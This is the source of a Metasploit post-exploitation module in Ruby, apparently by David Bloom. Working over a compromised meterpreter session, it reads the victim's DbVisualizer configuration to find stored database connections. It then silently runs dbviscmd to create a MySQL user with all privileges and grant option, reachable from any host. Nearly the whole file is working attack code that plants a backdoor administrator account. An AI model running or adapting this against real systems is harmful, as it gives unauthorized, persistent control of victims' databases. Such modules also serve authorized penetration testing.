##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/auxiliary/report'

class Metasploit3 < Msf::Post

  include Msf::Post::File
  include Msf::Post::Unix
  
  def initialize(info={})
    super( update_info( info,
        'Name'          => 'Multi manage Dbvis add remote admin',
        'Description'   => %q{
	   Dbvisulaizer offers a command line functionality to execute SQL pre-configured databases (With GUI).
           The remote database can be accessed from the command line without the need to authenticate.
           The module abuses this functionality to create an administrator in the database if DB user rights allow it. 
        },
        'License'       => MSF_LICENSE,
        'Author'        => [ 'David Bloom' ], # Twitter: @philophobia78
        'Platform'      => %w{ linux win },
        'SessionTypes'  => [ 'meterpreter' ]
      ))
   register_options(
      [
      OptString.new('DBALIAS', [true,'Use dbvis_enum module to find out databases and aliases', 'localhost']),
      OptString.new('DBUSERNAME', [true,'The user you want to add to the remote database', 'msf']),
      OptString.new('DBPASSWORD', [true,'User password to set', 'msfRocks']),
      OptBool.new('VERBOSE', [ true , 'Print sql response', false]),
      ], self.class)

  end

  def run
   dbType = existAndSupported()
   unless dbType.nil?
     dbvis = findDbviscmd()
     unless dbvis.nil?
       sql = getSQL(dbType)
       errors = dbvisQuery(dbvis,sql)
       if errors == true
	 print_error("No luck today, access is probably denied for configured user !? Try in verbose mode to know what happened. ")
       else
	 print_good("Privileged user created ! Try now to connect with user : #{datastore['DBUSERNAME']} and password : #{datastore['DBPASSWORD']}")
       end
     end
   end
  end

  # Check if the alias exist and if database is supported by this script
  def existAndSupported()

    case session.platform
    when /linux/
      user = session.shell_command("whoami").chomp
      print_status("Current user is " + user)
      if (user =~ /root/)
        user_base = "/root/"
      else
         user_base="/home/#{user}/"
      end
      dbvis_file = "#{user_base}.dbvis/config70/dbvis.xml"
    when /win/
      user_profile = session.sys.config.getenv('USERPROFILE')
      dbvis_file = user_profile + "\\.dbvis\\config70\\dbvis.xml"
    end

    unless file?(dbvis_file)
      #File not found, we next try with the old config path
      print_status("File not found: #{dbvis_file}")
      print_status("This could be an older version of dbvis, trying old path")
      case session.platform
      when /linux/
      	dbvis_file = user_base + ".dbvis/config/dbvis.xml"
      when /win/
      	dbvis_file = user_profile + "\\.dbvis\\config\\dbvis.xml"
      end
      unless file?(dbvis_file)
        print_error("File not found: " + dbvis_file)
        return
      end
      oldversion= true
    end

    print_status("Reading: " + dbvis_file )   
    raw_xml = ""
    begin
      raw_xml = read_file(dbvis_file)
    rescue EOFError
      # If there's nothing in the file, we hit EOFError
      print_error("Nothing read from file: #{dbvis_file}, file may be empty")
      return
    end

    dbfound=false
    aliasFound=false
    dbType=nil
    dbTypeOk=false

    # fetch config file
    raw_xml.each_line do |line|

      if line =~ /<Database id=/
        dbfound = true
      elsif line =~ /<\/Database>/
        dbfound=false
      end

      if dbfound == true

        # checkthe alias
        if (line =~ /<Alias>([\S+\s+]+)<\/Alias>/i)
          if datastore['DBALIAS'] == $1
            aliasFound = true
            print_good("Alias #{datastore['DBALIAS']} found in dbvis.xml")
	  end 
        end

	if (line =~ /<Userid>([\S+\s+]+)<\/Userid>/i)
          if aliasFound
            print_good("Username for this connection : " + $1)
	  end 
        end

        # check the type
        if (line =~ /<Type>([\S+\s+]+)<\/Type>/i)
          if aliasFound
	    dbType = $1
	    dbTypeOk = checkDbType(dbType)
            if dbTypeOk
              print_good("Database #{dbType} is supported ")
            else 
              print_error("Database #{dbType} is not supported (yet)")
              dbType=nil
	    end
          aliasFound = false
          end
        end
      end
    end
    if dbType.nil? 
	print_error("Database alias not found in dbvis.xml")
    end
    return dbType   # That is empty if DB is not supported
  end

  # Find path to dbviscmd.sh|bat
  def findDbviscmd
    case session.platform
    when /linux/
      dbVis = session.shell_command("locate dbviscmd.sh").chomp
      if dbVis.nil? or dbVis.chomp==""
        print_error("dbviscmd.sh not found")
        return nil
      else
        print_good("Dbviscmd found : " + dbVis )
      end
    when /win/
      # Find program files
      progfiles_env = session.sys.config.getenvs('ProgramFiles(X86)', 'ProgramFiles')
      progfilesx86 = progfiles_env['ProgramFiles(X86)']
      if not progfilesx86.nil? and progfilesx86 !~ /%ProgramFiles\(X86\)%/
        program_files = progfilesx86 # x64
      else
        program_files = progfiles_env['ProgramFiles'] # x86
      end
      dirs = []
      session.fs.dir.foreach(program_files) do |d|
        dirs << d
      end
      dbvisHomeDir = nil
      #Browse program content to find a possible dbvis home
      dirs.each do |d|
         if (d =~ /DbVisualizer[\S+\s+]+/i)
           dbvisHomeDir=d
         end
      end
      if  dbvisHomeDir.nil?
        print_error("Dbvis home not found, maybe uninstalled ?")
        return nil
      end
      dbVis = program_files + "\\" + dbvisHomeDir + "\\dbviscmd.bat"
      unless file?(dbVis)
        print_error("dbviscmd.bat not found")
        return nil
      end
      print_good("Dbviscmd found : " + dbVis )
    end
    return dbVis
  end

  # Query execution method
  def dbvisQuery(dbvis,sql)
    error =false
    resp=''
    #session.response_timeout=60
    print_status("Trying to execute evil sql, it can take time ...")
    args = "-connection " + datastore['DBALIAS'] + " -sql \"" + sql + "\""
    dbvis="\"" + dbvis + "\"" 
    resp = session.sys.process.execute(dbvis, args, {'Hidden' => true, 'Channelized' => true})
    
    while(d = resp.channel.read)
      if  datastore['VERBOSE'] == true
	print_status("#{d}")
      end
      if d =~ /denied|failed/i 
        error = true
      end
    end
    resp.channel.close
    resp.close
    return error
    rescue ::Exception => e
       print_error("Error Running Command: #{e.class} #{e}")
  end

  # Database dependent part

  # Check if db type is supported by this script
  def checkDbType(type)
   return  type.to_s =~ /mysql/i
  end

  # Build proper sql 
  def getSQL(dbType)
    
    if dbType =~ /mysql/i
       sql = "CREATE USER '#{datastore['DBUSERNAME']}'@'localhost' IDENTIFIED BY '#{datastore['DBPASSWORD']}';"
       sql += "GRANT ALL PRIVILEGES ON *.* TO '#{datastore['DBUSERNAME']}'@'localhost' WITH GRANT OPTION;"

       sql += "CREATE USER '#{datastore['DBUSERNAME']}'@'%' IDENTIFIED BY '#{datastore['DBPASSWORD']}';"
       sql += "GRANT ALL PRIVILEGES ON *.* TO '#{datastore['DBUSERNAME']}'@'%' WITH GRANT OPTION;"
       return sql
    end
    return nil
  end

end
